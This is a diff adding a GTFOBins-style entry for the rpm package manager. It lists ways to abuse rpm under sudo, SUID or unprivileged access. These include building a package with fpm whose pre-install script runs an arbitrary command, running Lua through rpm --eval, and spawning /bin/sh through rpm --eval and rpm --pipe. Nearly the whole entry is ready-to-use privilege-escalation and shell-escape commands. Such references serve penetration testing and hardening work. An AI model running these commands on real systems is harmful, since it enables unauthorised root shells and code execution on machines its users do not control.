@@ -1,0 +1,50 @@
+rpm
+===
+
+Command
+-------
+
+[Sudo]
+    rpm -ivh x-1.0-1.noarch.rpm
+    Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
+
+```
+echo /path/to/command >x.sh
+fpm -n x -s dir -t rpm -a all --before-install x.sh .
+```
+
+Inherit
+-------
+
+[Sudo]
+    rpm --eval '%{lua:...}'
+    This allows to run Lua code (`...`).
+
+[SUID]
+    rpm --eval '%{lua:...}'
+    This allows to run Lua code (`...`).
+
+[Unprivileged]
+    rpm --eval '%{lua:...}'
+    This allows to run Lua code (`...`).
+
+Shell
+-----
+
+[Sudo]
+    rpm --eval '%(/bin/sh 1>&2)'
+
+[SUID]
+    rpm --eval '%(/bin/sh 1>&2)'
+
+[Unprivileged]
+    rpm --eval '%(/bin/sh 1>&2)'
+
+[Sudo]
+    rpm --pipe '/bin/sh 0<&1'
+
+[SUID]
+    rpm --pipe '/bin/sh 0<&1'
+
+[Unprivileged]
+    rpm --pipe '/bin/sh 0<&1'
